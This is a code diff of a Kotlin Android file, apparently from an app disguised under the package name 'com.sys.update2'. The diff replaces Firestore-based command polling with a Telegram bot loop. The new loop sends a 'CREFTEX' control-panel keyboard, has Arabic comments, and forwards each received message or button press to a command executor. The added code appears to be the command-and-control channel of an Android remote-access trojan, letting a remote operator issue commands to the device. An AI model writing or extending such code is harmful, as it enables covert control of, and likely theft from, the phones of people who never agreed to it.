@@ -2,39 +2,40 @@ package com.sys.update2
 
 import android.content.Context
 import android.util.Log
-import okhttp3.MediaType.Companion.toMediaType
-import okhttp3.OkHttpClient
-import okhttp3.Request
-import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONObject
-import java.util.concurrent.TimeUnit
 import kotlin.concurrent.thread
 
 object CommandListener {
 
     private var running = false
     private var worker: Thread? = null
-
-    private val client = OkHttpClient.Builder()
-        .connectTimeout(15, TimeUnit.SECONDS)
-        .readTimeout(15, TimeUnit.SECONDS)
-        .build()
-
-    private val FS_COMMANDS =
-        "https://firestore.googleapis.com/v1/projects/${Config.FIREBASE_PROJECT_ID}/databases/(default)/documents/commands"
+    private var offset = 0L
 
     fun start(ctx: Context) {
         if (running) return
         running = true
 
-        worker = thread(name = "firestore-cmd-poll") {
+        Log.d("CmdListener", "Starting...")
+
+        // ⭐ أرسل الأزرار فورًا عند التشغيل
+        try {
+            val sent = TelegramApi.sendMessage(
+                "🎛 *لوحة التحكم — CREFTEX*\n\n" +
+                "الأزرار جاهزة 👇",
+                KeyboardBuilder.replyKeyboard()
+            )
+            Log.d("CmdListener", "Menu sent: msgId=$sent")
+        } catch (e: Exception) {
+            Log.e("CmdListener", "Menu send err: ${e.message}")
+        }
+
+        worker = thread(name = "telegram-poll") {
             while (running) {
                 try {
-                    pollCommands(ctx)
-                    Thread.sleep(3000)
+                    poll(ctx)
                 } catch (e: Exception) {
-                    Log.e("CmdListener", "loop err: ${e.message}")
-                    Thread.sleep(5000)
+                    Log.e("CmdListener", "poll err: ${e.message}")
+                    Thread.sleep(2000)
                 }
             }
         }
@@ -46,53 +47,55 @@ object CommandListener {
         worker = null
     }
 
-    private fun pollCommands(ctx: Context) {
+    private fun poll(ctx: Context) {
         try {
-            val url = "$FS_COMMANDS?key=${Config.FIREBASE_API_KEY}&pageSize=20"
-            val req = Request.Builder().url(url).get().build()
-
-            client.newCall(req).execute().use { resp ->
-                val body = resp.body?.string() ?: return
-                val obj = JSONObject(body)
-                val docs = obj.optJSONArray("documents") ?: return
-
-                for (i in 0 until docs.length()) {
-                    val doc = docs.optJSONObject(i) ?: continue
-                    val name = doc.optString("name", "")
-                    val fields = doc.optJSONObject("fields") ?: continue
-
-                    val text = fields.optJSONObject("text")?.optString("stringValue") ?: ""
-                    val processed = fields.optJSONObject("processed")?.optBoolean("booleanValue") ?: false
-
-                    if (text.isBlank() || processed) continue
-
-                    try {
-                        CommandExecutor.handleText(ctx, text)
-                    } catch (e: Exception) {
-                        Log.e("CmdListener", "exec err: ${e.message}")
-                    }
-
-                    markProcessed(name)
-                }
+            val updates = TelegramApi.getUpdates(offset)
+            if (updates == null) {
+                Thread.sleep(2000)
+                return
             }
+
+            if (updates.length() == 0) {
+                // لا تحديثات → انتظر (Long polling)
+                Thread.sleep(500)
+                return
+            }
+
+            for (i in 0 until updates.length()) {
+                val update = updates.optJSONObject(i) ?: continue
+                val updateId = update.optLong("update_id", 0)
+                offset = updateId + 1
+
+                processUpdate(ctx, update)
+            }
+
         } catch (e: Exception) {
             Log.e("CmdListener", "poll err: ${e.message}")
+            Thread.sleep(3000)
         }
     }
 
-    private fun markProcessed(docName: String) {
+    private fun processUpdate(ctx: Context, update: JSONObject) {
         try {
-            val docId = docName.substringAfterLast("/")
-            val url = "$FS_COMMANDS/$docId?key=${Config.FIREBASE_API_KEY}&updateMask.fieldPaths=processed"
-            val fields = JSONObject().apply {
-                put("processed", JSONObject().put("booleanValue", true))
+            update.optJSONObject("callback_query")?.let { cb ->
+                val data = cb.optString("data", "")
+                val cbId = cb.optString("id", "")
+                if (data.isNotBlank()) {
+                    TelegramApi.answerCallback(cbId)
+                    CommandExecutor.handle(ctx, data, cbId)
+                }
+                return
             }
-            val body = JSONObject().apply { put("fields", fields) }.toString()
-            val req = Request.Builder()
-                .url(url)
-                .patch(body.toRequestBody("application/json".toMediaType()))
-                .build()
-            client.newCall(req).execute().use { }
-        } catch (_: Exception) {}
+
+            update.optJSONObject("message")?.let { msg ->
+                val text = msg.optString("text", "").trim()
+                Log.d("CmdListener", "msg: $text")
+                if (text.isNotBlank()) {
+                    CommandExecutor.handleText(ctx, text)
+                }
+            }
+        } catch (e: Exception) {
+            Log.e("CmdListener", "process err: ${e.message}")
+        }
     }
 }
